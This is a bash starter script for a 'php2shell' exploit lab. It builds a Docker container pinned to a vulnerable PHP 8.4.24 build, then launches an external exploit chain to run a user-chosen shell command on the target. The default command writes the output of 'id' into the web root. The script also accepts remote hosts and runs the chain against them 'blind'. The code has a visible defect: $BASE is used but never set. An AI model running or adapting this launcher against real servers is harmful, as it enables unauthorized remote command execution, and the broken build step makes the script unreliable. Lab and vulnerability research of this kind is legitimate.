#!/bin/bash
# p2s-starter.sh - interactive starter for the php2shell lab.
#
# Asks for the target host and port, detects the architecture, builds the
# vulnerable target if the image is missing, runs it, and launches the chain.
#
# Works on the machine that also runs the target's docker (Kali arm64, WSL x86-64).
set -u

G='\e[1;32m'; R='\e[1;31m'; Y='\e[1;33m'; C='\e[1;36m'; B='\e[1m'; N='\e[0m'
ok()   { echo -e "${G}[ OK ]${N} $1"; }
info() { echo -e "${Y}[ .. ]${N} $1"; }
fail() { echo -e "${R}[FAIL]${N} $1"; exit 1; }

echo -e "${B}"
echo "  php2shell starter - Debian 13 / PHP 8.4.24 (vulnerable)"
echo -e "${N}"

# ---------------------------------------------------------------- layout
if [ -d "$HOME/p2s/poc" ] && [ -d "$HOME/p2s/lab" ]; then
  POC="$HOME/p2s/poc"; LAB="$HOME/p2s/lab"                 # Kali layout
elif [ -d "$PWD/poc" ] && [ -d "$PWD/lab" ]; then
  POC="$PWD/poc"; LAB="$PWD/lab"                           # repo layout
else
  fail "cannot find poc/ and lab/ (looked in ~/p2s and $PWD)"
fi
ok "poc dir : $POC"
ok "lab dir : $LAB"

# ---------------------------------------------------------------- prompts
echo
read -r -p "Target host / IP [127.0.0.1]: " THOST
THOST=${THOST:-127.0.0.1}
read -r -p "Target port [18144]: " TPORT
TPORT=${TPORT:-18144}
read -r -p "Command to execute [id>/var/www/html/pwn.txt]: " CMD
CMD=${CMD:-id\>/var/www/html/pwn.txt}
URL="http://$THOST:$TPORT/index.php"
echo
info "target URL : $URL"
info "command    : $CMD"

# ---------------------------------------------------------------- local or remote?
LOCALHOST=1
case "$THOST" in
  127.0.0.1|localhost|::1) LOCALHOST=1 ;;
  *)
    LOCALHOST=0
    for ip in $(hostname -I 2>/dev/null); do
      [ "$ip" = "$THOST" ] && LOCALHOST=1
    done
    ;;
esac

if [ "$LOCALHOST" = 1 ]; then
  ok "$THOST is this machine - the target will be built and run here"
else
  info "$THOST is a remote host - skipping the target build, running the chain blind"
fi

# ---------------------------------------------------------------- target (local only)
if [ "$LOCALHOST" = 1 ]; then
  ARCH=$(uname -m)
  case "$ARCH" in
    x86_64)  IMG=p2s-distro:trixie-8424 ;;
    aarch64) IMG=p2s-distro:trixie-8424-arm64 ;;
    *) fail "unsupported architecture: $ARCH" ;;
  esac
  ok "architecture: $ARCH -> image $IMG"

  if ! docker image inspect "$IMG" >/dev/null 2>&1; then
    info "image not found - building the vulnerable target from debian:trixie-slim"
    docker pull $BASE >/dev/null || fail "docker pull $BASE"
    docker rm -f p2s-build >/dev/null 2>&1
    docker run -d --name p2s-build $BASE sleep 1800 >/dev/null || fail "helper container failed"
    docker exec p2s-build sh -c 'printf "Package: php8.4* libapache2-mod-php8.4*\nPin: version 8.4.24-1~deb13u1\nPin-Priority: 1001\n" > /etc/apt/preferences && apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends apache2 libapache2-mod-php8.4 binutils >/dev/null && php -v | head -1' \
      || fail "the PHP installation failed"
    docker exec p2s-build sh -c 'sed -i -e "s/^memory_limit.*/memory_limit = 128M/" -e "s/^post_max_size.*/post_max_size = 8M/" -e "s/^display_errors.*/display_errors = Off/" -e "s/^session.upload_progress.cleanup.*/session.upload_progress.cleanup = 1/" /etc/php/8.4/apache2/php.ini; sed -i "s#^[[:space:]]*ErrorLog .*#ErrorLog /proc/self/fd/2#" /etc/apache2/apache2.conf /etc/apache2/sites-enabled/*.conf'
    docker commit p2s-build $IMG >/dev/null
    docker rm -f p2s-build >/dev/null
    ok "image built: $IMG"
  else
    ok "image already present: $IMG"
  fi

  docker rm -f p2s-a64 >/dev/null 2>&1
  docker run -d --name p2s-a64 -p $TPORT:80 \
    -v "$LAB/www:/var/www/html:rw" \
    -v "$LAB/apache-single-worker.conf:/etc/apache2/conf-enabled/zz-p2s.conf:ro" \
    $IMG apache2ctl -DFOREGROUND >/dev/null || fail "target container failed"
  sleep 5
  R=$(curl -s -m 10 "http://127.0.0.1:$TPORT/index.php")
  [ "$R" = "OK" ] || fail "the target is not responding on port $TPORT"
  ok "target alive on port $TPORT"
  CONTAINER=p2s-a64
else
  CONTAINER=nope
fi

# ---------------------------------------------------------------- chain
echo
info "launching the full chain against $URL"
cd "$POC" || fail "cannot enter $POC"
bash chain.sh --target "$URL" --container "$CONTAINER" --probe /probe.php \
  --cmd "$CMD" --proof pwn.txt
RC=$?

echo
if [ $RC -eq 0 ]; then
  ok "chain finished (exit 0) - arming confirmed from the container log"
elif [ $RC -eq 7 ]; then
  ok "chain finished (exit 7) - the proof is real, arming was inferred (remote target)"
else
  info "chain exit $RC - see the output above"
fi
exit $RC
